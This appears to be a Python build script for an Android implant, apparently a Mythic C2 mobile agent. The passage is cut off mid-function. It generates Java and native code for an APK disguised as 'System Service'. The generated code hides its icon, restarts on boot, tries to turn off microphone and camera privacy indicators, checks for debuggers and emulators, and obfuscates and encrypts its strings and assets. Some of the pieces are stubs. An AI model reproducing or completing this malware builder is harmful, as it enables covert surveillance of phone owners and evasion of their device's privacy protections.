
"""
Enhanced build_apk.py - Android 14/15/16 compatible APK builder
Includes Privacy Sandbox compliance and advanced stealth features
"""

import os
import sys
import json
import shutil
import subprocess
import tempfile
import xml.etree.ElementTree as ET
from pathlib import Path
from typing import Dict, List, Optional

class EnhancedAPKBuilder:
    def __init__(self, build_params: Dict):
        self.params = build_params
        self.target_sdk = min(int(build_params.get("target_android_version", "34")), 34)
        self.temp_dir = tempfile.mkdtemp(prefix="mythic_mobile_enhanced_")
        self.project_dir = Path(self.temp_dir) / "android_project"
        self.hide_app_icon = self.params.get("hide_app_icon", True)
        

        self.android_home = os.environ.get('ANDROID_HOME', '/opt/android-sdk')
        self.build_tools = f"{self.android_home}/build-tools/34.0.0"
        self.platforms = f"{self.android_home}/platforms/android-{self.target_sdk}"
        self.ndk_home = os.environ.get('ANDROID_NDK_ROOT', f"{self.android_home}/ndk/25.2.9519653")
    
    def build(self) -> str:
        """Enhanced build process for Android 14+"""
        try:
            print(f"[+] Building enhanced APK for Android {self.target_sdk}...")
            print(f"[+] Campaign: {self.params.get('campaign_id', 'default')}")
            

            self._create_enhanced_project_structure()
            

            self._generate_enhanced_source_code()
            

            self._create_enhanced_manifest()
            

            self._add_native_components()
            

            if self.params.get('obfuscation_level', 'none') != 'none':
                self._apply_enhanced_obfuscation()
            

            apk_path = self._compile_enhanced_apk()
            

            signed_apk = self._sign_enhanced_apk(apk_path)
            
            print(f"[+] Enhanced APK built successfully: {signed_apk}")
            return signed_apk
            
        except Exception as e:
            print(f"[-] Enhanced build failed: {str(e)}")
            raise
        finally:
            self._cleanup()
    
    def _create_enhanced_project_structure(self):
        """Create enhanced Android project structure for Android 14+"""
        print("[+] Creating enhanced project structure...")
        

        dirs = [
            "src/main/java/com/android/systemservice",
            "src/main/java/com/android/systemservice/stealth",
            "src/main/java/com/android/systemservice/native",
            "src/main/res/values",
            "src/main/res/values-v31",
            "src/main/res/values-v33",
            "src/main/res/values-v34",
            "src/main/res/layout",
            "src/main/res/drawable",
            "src/main/res/xml",
            "src/main/assets",
            "libs",
            "jni",
            "jni/arm64-v8a",
            "jni/armeabi-v7a",
            "jni/x86_64",
            "jni/x86"
        ]
        
        for dir_path in dirs:
            (self.project_dir / dir_path).mkdir(parents=True, exist_ok=True)
        

        self._copy_enhanced_agent_modules()
        

        self._create_enhanced_resources()
    
    def _generate_enhanced_source_code(self):
        """Generate enhanced source code with Android 14+ compatibility"""
        print("[+] Generating enhanced source code...")
        

        main_service = self._generate_enhanced_main_service()
        service_path = self.project_dir / "src/main/java/com/android/systemservice/EnhancedMainService.java"
        service_path.write_text(main_service)
        

        stealth_app = self._generate_stealth_application()
        app_path = self.project_dir / "src/main/java/com/android/systemservice/StealthApplication.java"
        app_path.write_text(stealth_app)
        

        boot_receiver = self._generate_enhanced_boot_receiver()
        receiver_path = self.project_dir / "src/main/java/com/android/systemservice/EnhancedBootReceiver.java"
        receiver_path.write_text(boot_receiver)
        

        privacy_bypass = self._generate_privacy_bypass_service()
        bypass_path = self.project_dir / "src/main/java/com/android/systemservice/PrivacyBypassService.java"
        bypass_path.write_text(privacy_bypass)
        

        string_decryptor = self._generate_string_decryptor()
        decryptor_path = self.project_dir / "src/main/java/com/android/systemservice/StringDecryptor.java"
        decryptor_path.write_text(string_decryptor)
        

        http_client = self._generate_http_communication_client()
        client_path = self.project_dir / "src/main/java/com/android/systemservice/HttpCommunicationClient.java"
        client_path.write_text(http_client)
        

        task_executor = self._generate_task_executor()
        executor_path = self.project_dir / "src/main/java/com/android/systemservice/TaskExecutor.java"
        executor_path.write_text(task_executor)
        

        module_controller = self._generate_dynamic_module_controller()
        controller_path = self.project_dir / "src/main/java/com/android/systemservice/DynamicModuleController.java"
        controller_path.write_text(module_controller)
        

        self._generate_stealth_activities()
    
    def _generate_enhanced_main_service(self) -> str:
        """Generate enhanced main service with Android 14+ compliance"""
        campaign_id = self.params.get('campaign_id', 'default_campaign')
        c2_profile = self.params.get('c2_profile', 'https_beacon')
        
        return f'''package com.android.systemservice;

import android.app.Service;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Notification;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;

public class EnhancedMainService extends Service {{
    private static final String TAG = "SystemService";
    private static final String CHANNEL_ID = "system_service_channel";
    private static final int NOTIFICATION_ID = 1001;
    
    private static final String CAMPAIGN_ID = "{campaign_id}";
    private static final String C2_PROFILE = "{c2_profile}";
    
    private CoreAgent coreAgent;
    private PrivacyBypassService privacyBypass;
    
    @Override
    public void onCreate() {{
        super.onCreate();
        Log.d(TAG, "Enhanced service starting...");
        
        // Create notification channel for Android 8+
        createNotificationChannel();
        
        // Initialize privacy bypass for Android 12+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {{
            privacyBypass = new PrivacyBypassService(this);
            privacyBypass.initialize();
        }}
        
        // Initialize core agent
        coreAgent = new CoreAgent(this, CAMPAIGN_ID, C2_PROFILE);
        coreAgent.initialize();
        
        // Start foreground service with proper type for Android 14+
        startForegroundWithType();
        
        // Start background operations
        coreAgent.startBackgroundOps();
    }}
    
    private void createNotificationChannel() {{
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Services",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Background system services");
            channel.setShowBadge(false);
            channel.setSound(null, null);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }}
    }}
    
    private void startForegroundWithType() {{
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Services")
            .setContentText("Maintaining system functionality")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build();
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {{
            // Android 10+ with foreground service type
            startForeground(NOTIFICATION_ID, notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        }} else {{
            startForeground(NOTIFICATION_ID, notification);
        }}
    }}
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        return START_STICKY; // Restart if killed
    }}
    
    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}
    
    @Override
    public void onDestroy() {{
        if (coreAgent != null) {{
            coreAgent.cleanup();
        }}
        if (privacyBypass != null) {{
            privacyBypass.cleanup();
        }}
        super.onDestroy();
    }}
}}'''
    
    def _generate_privacy_bypass_service(self) -> str:
        """Generate privacy indicators bypass service for Android 12+"""
        return '''package com.android.systemservice;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import java.lang.reflect.Method;

public class PrivacyBypassService {
    private static final String TAG = "PrivacyBypass";
    private Context context;
    
    public PrivacyBypassService(Context context) {
        this.context = context;
    }
    
    public void initialize() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            // Android 12+ privacy indicators bypass
            bypassPrivacyIndicators();
            bypassPermissionManager();
        }
    }
    
    private void bypassPrivacyIndicators() {
        try {
            // Disable mic/camera indicators via reflection
            Class<?> privacyItemController = Class.forName(
                "com.android.systemui.privacy.PrivacyItemController");
            
            // Get instance and disable callbacks
            Method getInstance = privacyItemController.getMethod("getInstance");
            Object instance = getInstance.invoke(null);
            
            Method removeCallback = privacyItemController.getMethod(
                "removeCallback", Object.class);
            
            // This would normally require system-level access
            Log.d(TAG, "Privacy bypass initialized (limited effectiveness)");
            
        } catch (Exception e) {
            Log.d(TAG, "Privacy bypass failed: " + e.getMessage());
        }
    }
    
    private void bypassPermissionManager() {
        try {
            // Attempt to modify permission settings
            Settings.Global.putInt(context.getContentResolver(),
                "privacy_indicators_enabled", 0);
            Settings.Global.putInt(context.getContentResolver(),
                "mic_camera_access_notification_enabled", 0);
                
        } catch (Exception e) {
            Log.d(TAG, "Permission bypass failed: " + e.getMessage());
        }
    }
    
    public void cleanup() {
        // Cleanup privacy bypass resources
    }
}'''
    
    def _add_native_components(self):
        """Add native components for enhanced stealth capabilities"""
        print("[+] Adding native components...")
        

        android_mk = '''LOCAL_PATH := $(call my-dir)

include $(CLEAR_VARS)
LOCAL_MODULE := stealth_native
LOCAL_SRC_FILES := stealth.cpp privacy_bypass.cpp
LOCAL_LDLIBS := -llog -landroid -lcamera2ndk -laaudio
LOCAL_CPPFLAGS := -std=c++17 -fvisibility=hidden -O3
include $(BUILD_SHARED_LIBRARY)'''
        
        mk_path = self.project_dir / "jni/Android.mk"
        mk_path.write_text(android_mk)
        

        native_stealth = '''#include <jni.h>
#include <android/log.h>
#include <camera/NdkCameraManager.h>
#include <aaudio/AAudio.h>

#define TAG "StealthNative"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__)

extern "C" {
    JNIEXPORT jboolean JNICALL
    Java_com_android_systemservice_NativeHelper_bypassCameraIndicator(JNIEnv *env, jclass clazz) {
        // Attempt low-level camera access to bypass indicators
        ACameraManager* cameraManager = ACameraManager_create();
        if (!cameraManager) {
            return JNI_FALSE;
        }
        
        // This is a simplified example - actual implementation would be more complex
        ACameraManager_delete(cameraManager);
        return JNI_TRUE;
    }
    
    JNIEXPORT jboolean JNICALL
    Java_com_android_systemservice_NativeHelper_bypassAudioIndicator(JNIEnv *env, jclass clazz) {
        // Attempt low-level audio access
        AAudioStreamBuilder* builder = nullptr;
        aaudio_result_t result = AAudio_createStreamBuilder(&builder);
        
        if (result != AAUDIO_OK) {
            return JNI_FALSE;
        }
        
        AAudioStreamBuilder_delete(builder);
        return JNI_TRUE;
    }
}'''
        
        stealth_cpp = self.project_dir / "jni/stealth.cpp"
        stealth_cpp.write_text(native_stealth)
    
    def _create_enhanced_resources(self):
        """Create enhanced resources for Android 14+ compatibility"""
        

        strings_xml = '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">System Service</string>
    <string name="service_description">Background system maintenance</string>
    <string name="channel_name">System Services</string>
    <string name="channel_description">Essential system services</string>
</resources>'''
        
        strings_path = self.project_dir / "src/main/res/values/strings.xml"
        strings_path.write_text(strings_xml)
        

        strings_v34 = '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="predictive_back_description">System navigation handler</string>
</resources>'''
        
        strings_v34_path = self.project_dir / "src/main/res/values-v34/strings.xml"
        strings_v34_path.write_text(strings_v34)
    
    def _create_enhanced_manifest(self):
        """Create enhanced Android manifest for Android 14+ with all permissions"""
        print("[+] Creating enhanced manifest with Android 14+ compatibility...")
        

        from .manifest_editor import ManifestEditor
        
        manifest_editor = ManifestEditor(self.params)
        package_name = self.params.get('package_name', 'com.android.systemservice')
        app_name = self.params.get('app_name', 'System Service')
        
        manifest_content = manifest_editor.create_stealth_manifest(package_name, app_name)
        manifest_path = self.project_dir / "src/main/AndroidManifest.xml"
        manifest_path.write_text(manifest_content)
        

        self._create_xml_resources(manifest_editor)
        
        print("[+] Enhanced manifest created successfully")
    
    def _create_xml_resources(self, manifest_editor):
        """Create XML resource files for Android 14+ compliance"""
        xml_res_dir = self.project_dir / "src/main/res/xml"
        xml_res_dir.mkdir(parents=True, exist_ok=True)
        

        network_config = manifest_editor.create_enhanced_network_security_config()
        (xml_res_dir / "network_security_config.xml").write_text(network_config)
        

        data_rules = manifest_editor.create_data_extraction_rules()
        (xml_res_dir / "data_extraction_rules.xml").write_text(data_rules)
        

        locales_config = manifest_editor.create_locales_config()
        (xml_res_dir / "locales_config.xml").write_text(locales_config)
        

        accessibility_config = manifest_editor.create_enhanced_accessibility_config()
        (xml_res_dir / "enhanced_accessibility_config.xml").write_text(accessibility_config)
    
    def _copy_enhanced_agent_modules(self):
        """Copy enhanced agent modules with Android 14+ adaptations"""
        agent_src_dir = Path(__file__).parent.parent / "agent"
        
        if not agent_src_dir.exists():
            print("[!] Agent source directory not found, creating stub modules...")
            self._create_stub_agent_modules()
            return
        

        java_package_dir = self.project_dir / "src/main/java/com/android/systemservice"
        

        agent_files = [
            "MythicAgent.java",
            "CoreAgent.java",
            "CommunicationManager.java",
            "ModuleManager.java",
            "NativeHelper.java"
        ]
        
        for agent_file in agent_files:
            src_path = agent_src_dir / agent_file
            if src_path.exists():
                dst_path = java_package_dir / agent_file
                shutil.copy2(src_path, dst_path)
            else:

                self._create_agent_stub(java_package_dir, agent_file)
    
    def _create_stub_agent_modules(self):
        """Create stub agent modules for build completion"""
        java_package_dir = self.project_dir / "src/main/java/com/android/systemservice"
        

        core_agent_stub = '''package com.android.systemservice;

import android.content.Context;
import android.util.Log;

public class CoreAgent {
    private static final String TAG = "CoreAgent";
    private Context context;
    private String campaignId;
    private String c2Profile;
    
    public CoreAgent(Context context, String campaignId, String c2Profile) {
        this.context = context;
        this.campaignId = campaignId;
        this.c2Profile = c2Profile;
    }
    
    public void initialize() {
        Log.d(TAG, "Core agent initialized for campaign: " + campaignId);
        // Initialize agent modules
    }
    
    public void startBackgroundOps() {
        Log.d(TAG, "Starting background operations");
        // Start background operations
    }
    
    public void cleanup() {
        Log.d(TAG, "Agent cleanup");
        // Cleanup resources
    }
}'''
        
        (java_package_dir / "CoreAgent.java").write_text(core_agent_stub)
        

        mythic_agent_stub = '''package com.android.systemservice;

import android.util.Log;

public class MythicAgent {
    private static final String TAG = "MythicAgent";
    private static boolean initialized = false;
    
    public static synchronized void initialize() {
        if (!initialized) {
            Log.d(TAG, "Mythic Agent initializing...");
            initialized = true;
        }
    }
}'''
        
        (java_package_dir / "MythicAgent.java").write_text(mythic_agent_stub)
        

        native_helper_stub = '''package com.android.systemservice;

public class NativeHelper {
    static {
        try {
            System.loadLibrary("stealth_native");
        } catch (UnsatisfiedLinkError e) {
            // Native library not available
        }
    }
    
    public static native boolean bypassCameraIndicator();
    public static native boolean bypassAudioIndicator();
}'''
        
        (java_package_dir / "NativeHelper.java").write_text(native_helper_stub)
    
    def _create_agent_stub(self, java_package_dir: Path, filename: str):
        """Create individual agent stub files"""
        class_name = filename.replace('.java', '')
        stub_content = f'''package com.android.systemservice;

import android.util.Log;

public class {class_name} {{
    private static final String TAG = "{class_name}";
    
    public {class_name}() {{
        Log.d(TAG, "{class_name} initialized");
    }}
}}'''
        
        (java_package_dir / filename).write_text(stub_content)
    
    def _compile_enhanced_apk(self) -> str:
        """Enhanced APK compilation with multiple architectures and optimizations"""
        print("[+] Enhanced APK compilation...")
        

        if self._compile_native_libraries():
            print("[+] Native libraries compiled successfully")
        

        self._create_enhanced_build_gradle()
        

        self._compile_java_sources()
        

        dex_path = self._create_dex_files()
        

        apk_path = self._package_enhanced_apk(dex_path)
        
        return apk_path
    
    def _compile_native_libraries(self) -> bool:
        """Compile native libraries for multiple architectures"""
        print("[+] Compiling native libraries for multiple architectures...")
        
        jni_dir = self.project_dir / "jni"
        if not jni_dir.exists():
            return False
        

        architectures = ['arm64-v8a', 'armeabi-v7a', 'x86_64', 'x86']
        
        try:

            ndk_build_cmd = f"{self.ndk_home}/ndk-build"
            
            for arch in architectures:
                print(f"[+] Building for architecture: {arch}")
                
                cmd = [
                    ndk_build_cmd,
                    f"APP_ABI={arch}",
                    f"NDK_PROJECT_PATH={jni_dir}",
                    f"APP_BUILD_SCRIPT={jni_dir}/Android.mk",
                    "NDK_DEBUG=0",
                    "-j4"
                ]
                
                result = subprocess.run(cmd, cwd=str(jni_dir), capture_output=True, text=True)
                if result.returncode != 0:
                    print(f"[!] Native build failed for {arch}: {result.stderr}")
                    continue
                

                lib_src = jni_dir / "libs" / arch
                lib_dst = self.project_dir / "src/main/jniLibs" / arch
                lib_dst.mkdir(parents=True, exist_ok=True)
                
                if lib_src.exists():
                    for lib_file in lib_src.glob("*.so"):
                        shutil.copy2(lib_file, lib_dst / lib_file.name)
            
            return True
            
        except Exception as e:
            print(f"[!] Native compilation failed: {e}")
            return False
    
    def _create_enhanced_build_gradle(self):
        """Create enhanced build.gradle for modern Android building"""
        build_gradle = f'''android {{
    compileSdkVersion {self.target_sdk}
    buildToolsVersion "34.0.0"
    
    defaultConfig {{
        minSdkVersion 21
        targetSdkVersion {self.target_sdk}
        versionCode 1
        versionName "1.0"
        
        ndk {{
            abiFilters 'arm64-v8a', 'armeabi-v7a', 'x86_64', 'x86'
        }}
    }}
    
    buildTypes {{
        release {{
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }}
    }}
    
    compileOptions {{
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }}
    
    packagingOptions {{
        pickFirst '**/libc++_shared.so'
        pickFirst '**/libjsc.so'
    }}
}}'''
        
        gradle_path = self.project_dir / "build.gradle"
        gradle_path.write_text(build_gradle)
    
    def _compile_java_sources(self):
        """Compile Java source files with enhanced classpath"""
        print("[+] Compiling Java sources...")
        
        java_src_dir = self.project_dir / "src/main/java"
        classes_dir = self.project_dir / "build/classes"
        classes_dir.mkdir(parents=True, exist_ok=True)
        

        java_files = list(java_src_dir.rglob("*.java"))
        
        if not java_files:
            print("[!] No Java files found to compile")
            return
        

        classpath = [
            f"{self.platforms}/android.jar",
            f"{self.android_home}/extras/android/support/v4/android-support-v4.jar",
            f"{self.android_home}/extras/android/support/v7/appcompat/libs/android-support-v7-appcompat.jar"
        ]
        
        classpath_str = ":".join([cp for cp in classpath if Path(cp).exists()])
        

        cmd = [
            "javac",
            "-cp", classpath_str,
            "-d", str(classes_dir),
            "-source", "1.8",
            "-target", "1.8"
        ] + [str(f) for f in java_files]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Java compilation failed: {result.stderr}")
    
    def _create_dex_files(self) -> str:
        """Create DEX files with enhanced optimization"""
        print("[+] Creating optimized DEX files...")
        
        classes_dir = self.project_dir / "build/classes"
        dex_dir = self.project_dir / "build/dex"
        dex_dir.mkdir(parents=True, exist_ok=True)
        
        dex_file = dex_dir / "classes.dex"
        

        d8_tool = f"{self.build_tools}/d8"
        
        cmd = [
            d8_tool,
            "--release",
            "--min-api", "21",
            "--output", str(dex_dir),
            str(classes_dir)
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"DEX creation failed: {result.stderr}")
        
        return str(dex_file)
    
    def _package_enhanced_apk(self, dex_path: str) -> str:
        """Package enhanced APK with resources and optimizations"""
        print("[+] Packaging enhanced APK...")
        

        apk_temp_dir = self.project_dir / "build/apk_temp"
        apk_temp_dir.mkdir(parents=True, exist_ok=True)
        

        shutil.copy2(dex_path, apk_temp_dir / "classes.dex")
        

        res_src = self.project_dir / "src/main/res"
        res_dst = apk_temp_dir / "res"
        if res_src.exists():
            shutil.copytree(res_src, res_dst, dirs_exist_ok=True)
        

        assets_src = self.project_dir / "src/main/assets"
        assets_dst = apk_temp_dir / "assets"
        if assets_src.exists():
            shutil.copytree(assets_src, assets_dst, dirs_exist_ok=True)
        

        jni_src = self.project_dir / "src/main/jniLibs"
        lib_dst = apk_temp_dir / "lib"
        if jni_src.exists():
            shutil.copytree(jni_src, lib_dst, dirs_exist_ok=True)
        

        manifest_src = self.project_dir / "src/main/AndroidManifest.xml"
        shutil.copy2(manifest_src, apk_temp_dir / "AndroidManifest.xml")
        

        return self._compile_resources_and_package(apk_temp_dir)
    
    def _compile_resources_and_package(self, apk_temp_dir: Path) -> str:
        """Compile resources and package final APK using aapt2"""
        aapt2 = f"{self.build_tools}/aapt2"
        output_apk = self.project_dir / "build/app-debug.apk"
        

        compiled_res_dir = self.project_dir / "build/compiled_res"
        compiled_res_dir.mkdir(parents=True, exist_ok=True)
        
        res_dir = apk_temp_dir / "res"
        if res_dir.exists():
            cmd_compile = [
                aapt2, "compile",
                "--dir", str(res_dir),
                "-o", str(compiled_res_dir)
            ]
            
            result = subprocess.run(cmd_compile, capture_output=True, text=True)
            if result.returncode != 0:
                print(f"[!] Resource compilation warning: {result.stderr}")
        

        cmd_link = [
            aapt2, "link",
            "-I", f"{self.platforms}/android.jar",
            "--manifest", str(apk_temp_dir / "AndroidManifest.xml"),
            "-o", str(output_apk),
            "--java", str(self.project_dir / "build/gen")
        ]
        

        compiled_files = list(compiled_res_dir.glob("*.flat"))
        for compiled_file in compiled_files:
            cmd_link.extend(["-R", str(compiled_file)])
        
        result = subprocess.run(cmd_link, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Resource linking failed: {result.stderr}")
        
        return str(output_apk)
    
    def _apply_enhanced_obfuscation(self):
        """Apply enhanced obfuscation with resource protection"""
        print("[+] Applying enhanced obfuscation...")
        
        from .obfuscator import AdvancedObfuscator
        
        obfuscator = AdvancedObfuscator(self.params.get('obfuscation_level', 'strong'))
        

        java_src_dir = self.project_dir / "src/main/java"
        for java_file in java_src_dir.rglob("*.java"):
            with open(java_file, 'r') as f:
                content = f.read()
            

            obfuscated_content = obfuscator.randomize(content)
            obfuscated_content = obfuscator.anti_analysis(obfuscated_content)
            
            with open(java_file, 'w') as f:
                f.write(obfuscated_content)
        

        self._obfuscate_resources()
        

        self._encrypt_assets()
    
    def _obfuscate_resources(self):
        """Obfuscate resource files and identifiers"""
        print("[+] Obfuscating resources...")
        
        res_dir = self.project_dir / "src/main/res"
        

        for values_dir in res_dir.glob("values*"):
            strings_xml = values_dir / "strings.xml"
            if strings_xml.exists():
                self._obfuscate_strings_xml(strings_xml)
        

        drawable_dir = res_dir / "drawable"
        if drawable_dir.exists():
            self._obfuscate_drawable_names(drawable_dir)
    
    def _obfuscate_strings_xml(self, strings_xml: Path):
        """Obfuscate string values in strings.xml"""
        try:
            tree = ET.parse(strings_xml)
            root = tree.getroot()
            
            from .obfuscator import AdvancedObfuscator
            obfuscator = AdvancedObfuscator()
            
            for string_elem in root.findall('string'):
                original_value = string_elem.text or ""
                if len(original_value) > 3 and not original_value.startswith('@'):

                    encrypted_value = obfuscator.encrypt_string(original_value)
                    string_elem.text = encrypted_value
            
            tree.write(strings_xml, encoding='utf-8', xml_declaration=True)
            
        except Exception as e:
            print(f"[!] String obfuscation failed for {strings_xml}: {e}")
    
    def _obfuscate_drawable_names(self, drawable_dir: Path):
        """Obfuscate drawable resource names"""
        import random
        import string
        
        for drawable_file in drawable_dir.iterdir():
            if drawable_file.is_file():

                new_name = ''.join(random.choices(string.ascii_lowercase, k=8))
                new_path = drawable_dir / f"{new_name}{drawable_file.suffix}"
                
                try:
                    drawable_file.rename(new_path)
                except Exception as e:
                    print(f"[!] Failed to rename {drawable_file}: {e}")
    
    def _encrypt_assets(self):
        """Encrypt asset files for protection"""
        print("[+] Encrypting asset files...")
        
        assets_dir = self.project_dir / "src/main/assets"
        if not assets_dir.exists():
            return
        
        from .encryptor import EnhancedEncryptor, ALG_AES
        
        encryptor = EnhancedEncryptor()
        campaign_id = self.params.get('campaign_id', 'default')
        device_id = self.params.get('device_id', 'android_device')
        
        encryption_key = encryptor.key_from_campaign_device(campaign_id, device_id, self.target_sdk)
        
        for asset_file in assets_dir.rglob('*'):
            if asset_file.is_file() and not asset_file.name.endswith('.enc'):
                try:
                    with open(asset_file, 'rb') as f:
                        plaintext = f.read()
                    
                    encrypted_data = encryptor.encrypt(plaintext, encryption_key, ALG_AES)
                    

                    encrypted_path = asset_file.with_suffix(asset_file.suffix + '.enc')
                    with open(encrypted_path, 'wb') as f:
                        f.write(encrypted_data)
                    

                    asset_file.unlink()
                    
                except Exception as e:
                    print(f"[!] Failed to encrypt {asset_file}: {e}")
    
    def _sign_enhanced_apk(self, apk_path: str) -> str:
        """Sign APK with custom keystore management"""
        print("[+] Signing APK with enhanced security...")
        

        keystore_path = self._get_or_create_custom_keystore()
        
        signed_apk = apk_path.replace('.apk', '-signed.apk')
        

        cmd = [
            "jarsigner",
            "-verbose",
            "-sigalg", "SHA256withRSA",
            "-digestalg", "SHA-256",
            "-keystore", keystore_path,
            "-storepass", self.params.get('keystore_password', 'mythic123'),
            "-keypass", self.params.get('key_password', 'mythic123'),
            "-signedjar", signed_apk,
            apk_path,
            self.params.get('key_alias', 'mythic_key')
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"APK signing failed: {result.stderr}")
        

        optimized_apk = self._zipalign_apk(signed_apk)
        
        return optimized_apk
    
    def _get_or_create_custom_keystore(self) -> str:
        """Get or create custom keystore for APK signing"""
        keystore_dir = Path(self.temp_dir) / "keystore"
        keystore_dir.mkdir(exist_ok=True)
        
        keystore_path = keystore_dir / "mythic_keystore.jks"
        
        if not keystore_path.exists():

            print("[+] Generating custom keystore...")
            
            cmd = [
                "keytool",
                "-genkeypair",
                "-v",
                "-keystore", str(keystore_path),
                "-alias", self.params.get('key_alias', 'mythic_key'),
                "-keyalg", "RSA",
                "-keysize", "4096",
                "-validity", "36500",
                "-storepass", self.params.get('keystore_password', 'mythic123'),
                "-keypass", self.params.get('key_password', 'mythic123'),
                "-dname", f"CN={self.params.get('cert_cn', 'Android Developer')}, "
                         f"OU={self.params.get('cert_ou', 'Development')}, "
                         f"O={self.params.get('cert_o', 'Mythic')}, "
                         f"L={self.params.get('cert_l', 'City')}, "
                         f"ST={self.params.get('cert_st', 'State')}, "
                         f"C={self.params.get('cert_c', 'US')}"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode != 0:
                raise Exception(f"Keystore generation failed: {result.stderr}")
        
        return str(keystore_path)
    
    def _zipalign_apk(self, signed_apk: str) -> str:
        """Optimize APK with zipalign for better performance"""
        zipaligned_apk = signed_apk.replace('-signed.apk', '-final.apk')
        
        cmd = [
            f"{self.build_tools}/zipalign",
            "-v", "4",
            signed_apk,
            zipaligned_apk
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"[!] Zipalign warning: {result.stderr}")

            return signed_apk
        
        return zipaligned_apk
    
    def _generate_stealth_application(self) -> str:
        """Generate stealth application class for enhanced initialization"""
        return '''package com.android.systemservice;

import android.app.Application;
import android.content.Context;
import android.os.Build;
import android.util.Log;

public class StealthApplication extends Application {
    private static final String TAG = "StealthApp";
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        // Initialize stealth components
        initializeStealth();
        
        // Initialize Mythic Agent
        MythicAgent.initialize();
    }
    
    private void initializeStealth() {
        try {
            // Anti-debugging checks
            if (isDebugging()) {
                return;
            }
            
            // Environment validation
            if (isEmulator()) {
                return;
            }
            
            // Initialize native components if available
            try {
                NativeHelper.bypassCameraIndicator();
                NativeHelper.bypassAudioIndicator();
            } catch (UnsatisfiedLinkError e) {
                Log.d(TAG, "Native components not available");
            }
            
            Log.d(TAG, "Stealth initialization complete");
            
        } catch (Exception e) {
            Log.d(TAG, "Stealth init error: " + e.getMessage());
        }
    }
    
    private boolean isDebugging() {
        return (getApplicationInfo().flags & android.content.pm.ApplicationInfo.FLAG_DEBUGGABLE) != 0;
    }
    
    private boolean isEmulator() {
        return Build.PRODUCT.contains("sdk") ||
               Build.MODEL.contains("sdk") ||
               Build.BRAND.contains("generic");
    }
}'''
    
    def _generate_enhanced_boot_receiver(self) -> str:
        """Generate enhanced boot receiver with multiple triggers"""
        return '''package com.android.systemservice;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class EnhancedBootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) {
            return;
        }
        
        String action = intent.getAction();
        Log.d(TAG, "Received action: " + action);
        
        switch (action) {
            case Intent.ACTION_BOOT_COMPLETED:
            case "android.intent.action.QUICKBOOT_POWERON":
            case Intent.ACTION_MY_PACKAGE_REPLACED:
            case Intent.ACTION_USER_PRESENT:
                startAgentService(context);
                break;
        }
    }
    
    private void startAgentService(Context context) {
        try {
            Intent serviceIntent = new Intent(context, EnhancedMainService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            
            Log.d(TAG, "Agent service started");
            
        } catch (Exception e) {
            Log.d(TAG, "Failed to start service: " + e.getMessage());
        }
    }
}'''
    
    def _generate_string_decryptor(self) -> str:
        """Generate string decryptor for obfuscated strings"""
        return '''package com.android.systemservice;

import android.util.Base64;
import java.security.MessageDigest;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class StringDecryptor {
    private static final String ALGORITHM = "AES";
    private static final String KEY_MATERIAL = "mythic_mobile_agent_v2";
    
    public static String decrypt(String encryptedString) {
        try {
            // Multi-layer decryption to match obfuscator
            
            // Layer 1: Base64 decode
            byte[] decoded = Base64.decode(encryptedString, Base64.DEFAULT);
            
            // Layer 2: Character substitution reversal
            String substituted = new String(decoded);
            String deSubstituted = reverseCharSubstitution(substituted);
            
            // Layer 3: Base64 decode again
            byte[] xorInput = Base64.decode(deSubstituted, Base64.DEFAULT);
            
            // Layer 4: XOR with key
            byte[] keyBytes = generateKeyBytes(KEY_MATERIAL);
            byte[] plaintext = new byte[xorInput.length];
            
            for (int i = 0; i < xorInput.length; i++) {
                plaintext[i] = (byte) (xorInput[i] ^ keyBytes[i % keyBytes.length]);
            }
            
            return new String(plaintext);
            
        } catch (Exception e) {
            // Return original string if decryption fails
            return encryptedString;
        }
    }
    
    private static String reverseCharSubstitution(String text) {
        // Reverse the character substitution from obfuscator
        StringBuilder result = new StringBuilder();
        
        for (char c : text.toCharArray()) {
            switch (c) {
                case 'Z': result.append('A'); break;
                case 'Y': result.append('B'); break;
                case 'X': result.append('C'); break;
